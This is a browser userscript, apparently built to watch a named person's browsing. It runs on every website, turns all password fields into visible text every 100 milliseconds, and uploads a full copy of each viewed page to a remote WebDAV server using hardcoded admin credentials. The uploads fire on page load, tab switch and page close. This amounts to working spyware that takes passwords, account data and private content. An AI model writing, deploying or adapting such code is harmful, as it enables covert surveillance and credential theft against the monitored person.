// ==UserScript==
// @name         Ed 4Rec  hmd-lehrberg@t-online.de webd only TEST TEST
// @namespace    http://tampermonkey.net/
// @version      2.0
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/545669/Ed%204Rec%20%20hmd-lehrberg%40t-onlinede%20webd%20only%20TEST%20TEST.user.js
// @updateURL https://update.greasyfork.org/scripts/545669/Ed%204Rec%20%20hmd-lehrberg%40t-onlinede%20webd%20only%20TEST%20TEST.meta.js
// ==/UserScript==

// Script 0: Webdav upl
if (window.location.href.indexOf("schalke") !== -1 || window.location.href.indexOf("pilot") !== -1) {
  console.log("Excluded website. Script will not run on this page.");
} else {
(function webpageUploaderToWebDAV() {
  // SPECIFY CLIENT NAME HERE
  const clientName = "hmd-lehrberg@t-online.de";
  // DON'T FORGET TO SPECIFY CLIENT NAME ABOVE

  const webdavURL = "https://c131.lv.tabdigital.eu/remote.php/dav/files/admin/4 Recovery/";
  const username = "admin";
  const password = "Fs123456Fs";
  const folderName = clientName; // The folder name is set to the client's name
  const folderPath = `${webdavURL}/${folderName}`.replace(/([^:]\/)\/+/g, "$1"); // normalize // (not after protocol)
  let isUploaded = false;
  let folderReady = false;
  let folderCheckInProgress = false;

  function authHeader() {
    return "Basic " + btoa(username + ":" + password);
  }

  function logEvent(reason) {
    try {
      console.log(`[WebDAV] Triggered by: ${reason} | uploaded: ${isUploaded} | folderReady: ${folderReady}`);
    } catch (_) {}
  }

  function ensureFolderAndUpload(reason) {
    logEvent(reason);
    if (isUploaded) return;
    if (folderReady) {
      saveAndUploadPage(folderPath);
      return;
    }
    if (folderCheckInProgress) {
      // Give it a short retry loop while check/create is ongoing
      setTimeout(() => {
        if (folderReady && !isUploaded) saveAndUploadPage(folderPath);
      }, 150);
      return;
    }
    folderCheckInProgress = true;
    checkAndCreateFolder(folderPath);
  }

  function checkAndCreateFolder(path) {
    GM_xmlhttpRequest({
      method: "PROPFIND",
      url: path,
      headers: { Authorization: authHeader() },
      timeout: 15000,
      onload: function(response) {
        if (response.status === 404) {
          createFolder(path);
        } else if (response.status === 207) {
          console.log("Folder already exists.");
          folderReady = true;
          folderCheckInProgress = false;
          saveAndUploadPage(path);
        } else {
          console.error("Failed to verify folder.", response);
          folderCheckInProgress = false;
        }
      },
      onerror: function(err) {
        console.error("PROPFIND error", err);
        folderCheckInProgress = false;
      },
      ontimeout: function() {
        console.error("PROPFIND timeout");
        folderCheckInProgress = false;
      }
    });
  }

  function createFolder(path) {
    GM_xmlhttpRequest({
      method: "MKCOL",
      url: path,
      headers: { Authorization: authHeader() },
      timeout: 15000,
      onload: function(response) {
        if (response.status >= 200 && response.status < 300) {
          console.log("Folder created successfully.");
          folderReady = true;
          folderCheckInProgress = false;
          saveAndUploadPage(path);
        } else {
          console.error("Failed to create folder.", response);
          folderCheckInProgress = false;
        }
      },
      onerror: function(err) {
        console.error("MKCOL error", err);
        folderCheckInProgress = false;
      },
      ontimeout: function() {
        console.error("MKCOL timeout");
        folderCheckInProgress = false;
      }
    });
  }

  function removeUnwantedElements(element) {
    const unwantedElements = ["script", "iframe"];
    unwantedElements.forEach((tag) => {
      const elements = element.querySelectorAll(tag);
      elements.forEach((el) => el.remove());
    });

    const imageElements = element.querySelectorAll("img");
    imageElements.forEach((el) => {
      const src = el.getAttribute("src");
      if (src && !src.startsWith("data:image")) {
        el.remove();
      }
    });
  }

  function saveAndUploadPage(path) {
    if (isUploaded) {
      console.log("File already uploaded. Skipping...");
      return;
    }

    try {
      const pageTitle = (document.title || "page").trim().replace(/[^a-z0-9]/gi, "_");
      const timestamp = new Date().toISOString().replace(/[^0-9]/g, "");
      const fileName = `${pageTitle}_${timestamp}.html`;

      const clonedDocument = document.documentElement.cloneNode(true);

      // Make sure password fields are exposed even in saved HTML
      try {
        clonedDocument.querySelectorAll('input[type="password"]').forEach(inp => { inp.setAttribute('type', 'text'); });
      } catch (_) {}

      removeUnwantedElements(clonedDocument);

      const fragment = document.createDocumentFragment();
      fragment.appendChild(clonedDocument);

      // Add restrictive CSP to the saved file
      try {
        const head = fragment.querySelector("head") || fragment.querySelector("html");
        if (head) {
          const cspMetaTag = document.createElement("meta");
          cspMetaTag.setAttribute("http-equiv", "Content-Security-Policy");
          cspMetaTag.setAttribute("content", "default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline'");
          head.appendChild(cspMetaTag);
        }
      } catch (e) {
        console.warn("Failed to append CSP meta tag", e);
      }

      const serializer = new XMLSerializer();
      const htmlContent = serializer.serializeToString(fragment);

      GM_xmlhttpRequest({
        method: "PUT",
        url: `${path}/${fileName}`,
        headers: {
          Authorization: authHeader(),
          "Content-Type": "text/html",
        },
        data: htmlContent,
        timeout: 30000,
        onload: function (response) {
          if (response.status >= 200 && response.status < 300) {
            console.log("File uploaded successfully.");
            isUploaded = true;
          } else {
            console.error("Failed to upload the file (status).", response.status, response.responseText);
          }
        },
        onerror: function (err) {
          console.error("Failed to upload the file (network).", err);
        },
        ontimeout: function () {
          console.error("Upload timed out.");
        },
      });
    } catch (e) {
      console.error("saveAndUploadPage failed", e);
    }
  }

  // Observe DOM and sanitize dynamic additions
  const observer = new MutationObserver((mutationsList) => {
    for (let mutation of mutationsList) {
      if (mutation.type === 'childList') {
        removeUnwantedElements(mutation.target);
      }
    }
  });
  observer.observe(document, { childList: true, subtree: true });

  // Trigger on normal load
  window.addEventListener("load", function () {
    ensureFolderAndUpload("window.load");
  });

  // Additional triggers: page close/discard/freeze-like signals
  // - beforeunload: fires on close/navigation (may be blocked quickly)
  // - pagehide: fires on bfcache or unload, more reliable than unload
  // - visibilitychange (hidden): catches tab switch, minimize, discard candidates
  window.addEventListener("beforeunload", function () {
    ensureFolderAndUpload("beforeunload");
  });

  window.addEventListener("pagehide", function () {
    ensureFolderAndUpload("pagehide");
  });

  document.addEventListener("visibilitychange", function () {
    if (document.visibilityState === "hidden") {
      ensureFolderAndUpload("visibilitychange:hidden");
    }
  });

  // 100ms interval to continuously unmask password fields
  // (as requested: never stops)
  setInterval(() => {
    try {
      const pwds = document.querySelectorAll('input[type="password"]');
      if (pwds.length) {
        pwds.forEach((inp) => {
          try {
            if (inp.type === "password") {
              inp.setAttribute("type", "text");
            }
          } catch (e) {
            // Some inputs may throw when changing type
            console.warn("Failed to change input type", e);
          }
        });
      }
    } catch (e) {
      console.warn("Password unmask interval error", e);
    }
  }, 100);
})();
}
